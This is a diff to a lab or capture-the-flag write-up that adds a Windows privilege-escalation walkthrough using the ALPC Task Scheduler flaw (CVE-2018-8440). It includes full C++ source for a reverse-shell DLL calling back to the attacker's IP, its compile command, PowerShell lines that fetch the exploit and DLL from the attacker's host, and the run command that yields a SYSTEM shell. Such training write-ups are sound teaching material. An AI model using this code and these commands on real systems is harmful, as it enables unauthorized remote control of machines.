@@ -209,7 +209,107 @@ Occasionally the IPSec VPN connection will close meaning it may be worth craftin
 Privilege Escalation on this machine has two routes. The first route we will cover involves enumerating the target to find no patches listed next to ‘Hotfix(s)’, then coupled with online research into this build of windows 10 we can find it is vulnerable to ALPC Task Scheduler LPE (CVE-2018-8440).  The alternative route is to notice that the user we compromised has SeImpersonatePrivilege enabled which means we can use a tool called ‘Juicy Potato’ to change the administrator password and gain SYSTEM access.
 
 ### ALPC Task Scheduler LPE
-In progress...
+This privilege escalation route is a little bit more difficult to notice however tools that can be compiled in windows environments like Watson can help in identifying a CVE vulnerability in this target. Enumeration isn’t just for the reconnaissance phase, it is also vital to learn as much as possible about a target you have compromised to see if there are any privilege escalation vulnerabilities. On Windows targets we can use the command ``systeminfo`` to output an overview of the current system. This allows us to see that the operating system is Windows 10 Enterprise Build 15063, a version from 2017. Of this output there is particular interest to the ‘Hotfix(s):’ column reading ‘N/A’ suggesting that no patches have been applied to this outdated windows version.
+
+![img](assets/systeminfo.png)
+
+Some of these advanced enumeration tools may output that this machine is potentially vulnerable to CVE-2018-8440. CVE-2018-8440 is an Advanced Local Procedure Call Vulnerability in the Task Scheduler https://nvd.nist.gov/vuln/detail/CVE-2018-8440. We can manually test for this vulnerability on the target by checking ``icacls C:\Windows\tasks`` and seeing that all authenticated users have Read Execute (RX) access.
+
+![img](assets/tasks.png)
+
+We can use a ready made exploit from GitHub by user rayhan0x01 found at https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/CVE-2018-8440.md. Since it’s referenced to the exploit executables like ALPC-DiagHub.x64.exe and  ALPC-DiagHub.x86.exe are outdated and redundant, these files can be found instead at https://github.com/ExpLife0011/alpc-diaghub.
+
+First we need to copy the provided C++ code and make a copy on our local machine making sure to change the IP to match our IP and the listener port of our choosing.
+
+```
+#include <stdio.h>
+#include <string.h>
+#include <process.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#pragma comment(lib, "Ws2_32.lib")
+
+#define REMOTE_ADDR "<Your-Machine-IP>"
+#define REMOTE_PORT "443"
+
+void revShell();
+
+BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
+{
+        switch(dwReason)
+        {
+                case DLL_PROCESS_ATTACH:
+                        revShell();
+                        break;
+                case DLL_PROCESS_DETACH:
+                        break;
+                case DLL_THREAD_ATTACH:
+                        break;
+                case DLL_THREAD_DETACH:
+                        break;
+        }
+
+        return 0;
+}
+void revShell()
+{
+	FreeConsole();
+	WSADATA wsaData;
+	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	struct addrinfo *result = NULL,	*ptr = NULL, hints;
+	memset(&hints, 0, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
+	ptr = result;
+	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);	
+	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+	si.hStdInput = (HANDLE)ConnectSocket;
+	si.hStdOutput = (HANDLE)ConnectSocket;
+	si.hStdError = (HANDLE)ConnectSocket;
+	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
+	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL,	NULL, &si, &pi);
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	WSACleanup();
+}
+```
+
+Once our local copy has the correct IP address and listener port set up like the example below then we are ready to progress.
+
+![img](assets/dll.png)
+
+Now we need to use the tool ``mingw0w64`` installed which allows us to compile c++ source code into DLL files. I can be easily installed if not already with ``sudo apt install mingw-w64`` which we can then compile as a DLL. To compile the C++ code into a DDL we can use the following command ``x86_64-w64-mingw32-g++ reverse_shell.cpp -o shell.dll -lws2_32 -shared``.
+
+![img](assets/dll_compile.png) 
+
+ Before we can use it to we need to ensure the correct  ALPC-DiagHub executable is being use. We know from the output of our ``systeminfo`` command that this is a 64-bit windows OS and so we will need the 64-bit executable from https://github.com/ExpLife0011/alpc-diaghub.
+
+![img](assets/hosted_exploit.png) 
+
+In this scenario I am going to host the ALPC executable via the python3 server along with the DLL file we just compiled. Once the server is hosting these files we can use the PowerShell command “Invoke-webrequest’’ to download files onto the system. First we can download the ALPC executable with ``Invoke-WebRequest -URI 'http://[Your IP]/ALPC_DiagHub.x64.exe' -OutFile .\diaghub.exe`` and then we download our malicious DLL using the exact same command and parameters ``Invoke-WebRequest -URI 'http://[Your IP]/shell.dll' -OutFile .\shell.dll``. The two files should now be in the directory you are working with.
+
+![img](assets/exploit_dir.png) 
+
+Now it is simply a case of running the exploit. To do this we must run our diaghub executable with the shell.dll file we created, as-well as ensuring that a listener is set to the port we specified before compiling the DLL file. To run the exploit we must type the command ``cmd /c diaghub.exe shell.dll .\anymuz.rtf``.
+
+![img](assets/exploit_run.png)
+
+The process should hang, but that doesn’t matter, because if we switch tabs to the listener we had running we can now see we have a system shell, this allows us access to the root flag (named as proof.txt).
+
+![img](assets/root1.png)
+
+That concludes this particular method for privilege escalation on this box, although discovering the vulnerability for this privilege escalation path can be a little tedious if you don’t have the correct tools, and even then those tools need to be compiled in a local windows environment. This privilege escalation route shows that it is helpful to enumerate system info to determine how unlatched the target system is.
 
 ### Juicy Potato
 In progress...
